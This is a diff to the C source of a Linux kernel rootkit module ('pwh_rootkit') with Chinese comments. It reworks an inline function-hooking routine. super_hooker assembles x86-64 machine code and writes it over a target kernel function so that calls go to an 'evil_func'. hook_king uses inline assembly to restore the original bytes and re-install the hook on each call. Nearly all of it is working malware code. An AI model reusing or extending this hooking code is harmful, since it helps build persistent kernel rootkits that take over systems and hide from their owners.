@@ -92,7 +92,7 @@ static void funny_joke(void){
     arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
     */
 
-static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t hooker_addr){
+static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t hooker_addr, size_t shellcode_addr){
     asm volatile(
         "subq $0x58, %%rsp;"
         "movq %0, %%rdi;"
@@ -100,18 +100,34 @@ static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t 
         "movq %1, %%rsi;"
         "movq %2, %%rdx;"
         "movq %3, %%rcx;"
+        "movq %4, %%r11;"
+        "movq %0, %%r12;"
+        "movq %5, %%r13;"
+        "movq %2, %%r14;"
+        "push %%r15;"
+        "push %%r14;"
+        "push %%r13;"
+        "push %%r12;"
+        "push %%r11;"
         "push %%rcx;"
         "call *%4;"
         "pop %%rcx;"
         "call *%%rcx;"
+
+        "pop %%r11;"
+        "pop %%r12;"
+        "pop %%r13;"
+        "pop %%r14;"
+        "pop %%r15;"
+
         "addq $0x58, %%rsp;"
         "pop %%rsp;"
         "pop %%rbp;"
-        "pop %%r14;"        //原本是r15
-        "pop %%r14;"
-        "pop %%r13;"
-        "pop %%r12;"
-        "pop %%r11;"
+        "pop %%r10;"        //原本是r15
+        "pop %%r10;"
+        "pop %%r10;"
+        "pop %%r10;"
+        "pop %%r10;"
         "pop %%r10;"
         "pop %%r9;"
         "pop %%r8;"
@@ -121,10 +137,26 @@ static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t 
         "pop %%rcx;"
         "pop %%rbx;"
         "pop %%rax;"
+        "push %%r15;"
+        "push %%r14;"
+        "push %%r13;"
+        "push %%r12;"
+        "push %%r11;"
+
         "call *%%r15;" 
+
+        "pop %%r11;"
+        "pop %%r12;"
+        "pop %%r13;"
+        "pop %%r14;"
+        "pop %%r15;"
+        "movq %%r12, %%rdi;"
+        "movq %%r13, %%rsi;"
+        "movq %%r14, %%rdx;"
+        "call *%%r11;"
         :
-        : "r"(hooked_addr), "r"(orig_code), "r"(count), "r"(hooker_addr), "r"((size_t)arbitrary_remap_write)
-        : "%rdi", "%rsi", "%rdx", "%rdx");
+        : "r"(hooked_addr), "r"(orig_code), "r"(count), "r"(hooker_addr), "r"((size_t)arbitrary_remap_write), "r"(shellcode_addr)
+        : );
 }
 
 
@@ -135,12 +167,13 @@ static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t coun
 
 #define SHELLCODE_MAX_NR 1024
 static size_t orig_code[SHELLCODE_MAX_NR] = {0};
+static u8 shell_code[SHELLCODE_MAX_NR] = {0};
 
 static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
     size_t shellcode_nr;
     size_t index;
     size_t *share_orig;
-    u8 *shellcode;
+    size_t *share_shell;
     size_t hook_ctl;
     u8 store_regs[] = {0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x54 };
     hook_ctl = (size_t)hook_king;
@@ -161,75 +194,83 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
     shellcode_nr += sizeof(u8) + sizeof(u8);
     shellcode_nr += sizeof(size_t);
 
+
+    // mov r8, *       0x49 0xb8
+    shellcode_nr += sizeof(u8) + sizeof(u8);
+    shellcode_nr += sizeof(size_t);
+
+
+
     // mov rax, *       0x48 0xb8
     shellcode_nr += sizeof(u8) + sizeof(u8);
     shellcode_nr += sizeof(size_t);
     // jmp rax          0xff 0xe0
     shellcode_nr += sizeof(u8) + sizeof(u8);
 
-    shellcode = kmalloc(shellcode_nr, GFP_KERNEL);
-    if(!shellcode){
-        return PTR_ERR((void *)shellcode);
-    }
 
-    memset(shellcode, 0, shellcode_nr);
     /* 保存指令 */
     memcpy((size_t *)orig_code, (size_t *)hook_addr, shellcode_nr);
     share_orig = orig_code;
+    share_shell = (size_t *)shell_code;
     
     index = 0;
 
     /* 保存现场 */
     for(int i = 0; i < sizeof(store_regs) ; i++){
-        shellcode[index++] = store_regs[i];
+        shell_code[index++] = store_regs[i];
     }
 
     /* mov rdi, hook_addr */
-    shellcode[index++] = 0x48;
-    shellcode[index++] = 0xBF;
+    shell_code[index++] = 0x48;
+    shell_code[index++] = 0xBF;
     for(int i = 0; i < sizeof(size_t) ; i++){
         //写入orig_code的地址
-        shellcode[index++] = ((char *)&hook_addr)[i];
+        shell_code[index++] = ((char *)&hook_addr)[i];
     }
 
     /* mov rsi, orig_code */
-    shellcode[index++] = 0x48;
-    shellcode[index++] = 0xBE;
+    shell_code[index++] = 0x48;
+    shell_code[index++] = 0xBE;
     for(int i = 0; i < sizeof(size_t) ; i++){
         //写入orig_code的地址
-        shellcode[index++] = ((char *)(&share_orig))[i];
+        shell_code[index++] = ((char *)(&share_orig))[i];
     }
 
     /* mov rdx, shellcode_nr */
-    shellcode[index++] = 0x48;
-    shellcode[index++] = 0xBA;
+    shell_code[index++] = 0x48;
+    shell_code[index++] = 0xBA;
     for(int i = 0; i < sizeof(size_t) ; i++){
-        //写入orig_code的地址
-        shellcode[index++] = ((char *)&shellcode_nr)[i];
+        shell_code[index++] = ((char *)&shellcode_nr)[i];
     }
 
     /* mov rcx, evil_func */
-    shellcode[index++] = 0x48;
-    shellcode[index++] = 0xB9;
+    shell_code[index++] = 0x48;
+    shell_code[index++] = 0xB9;
     for(int i = 0; i < sizeof(size_t) ; i++){
         //写入orig_code的地址
-        shellcode[index++] = ((char *)&evil_func)[i];
+        shell_code[index++] = ((char *)&evil_func)[i];
+    }
+
+    /* mov r8, shellcode */
+    shell_code[index++] = 0x49;
+    shell_code[index++] = 0xb8;
+    for(int i = 0; i < sizeof(size_t) ; i++){
+        shell_code[index++] = ((char *)&share_shell)[i];
     }
 
     /* mov rax, shellcode */
-    shellcode[index++] = 0x48;
-    shellcode[index++] = 0xB8;
+    shell_code[index++] = 0x48;
+    shell_code[index++] = 0xB8;
     for(int i = 0; i < sizeof(size_t) ; i++){
-        shellcode[index++] = ((char *)&hook_ctl)[i];
+        shell_code[index++] = ((char *)&hook_ctl)[i];
     }
     /* jmp rax */
-    shellcode[index++] = 0xFF;
-    shellcode[index++] = 0xE0;
+    shell_code[index++] = 0xFF;
+    shell_code[index++] = 0xE0;
 
 
-    arbitrary_remap_write((void *)hook_addr, shellcode, shellcode_nr);
+    arbitrary_remap_write((void *)hook_addr, shell_code, shellcode_nr);
 
-    kfree(shellcode);
     return 0;
 }
 
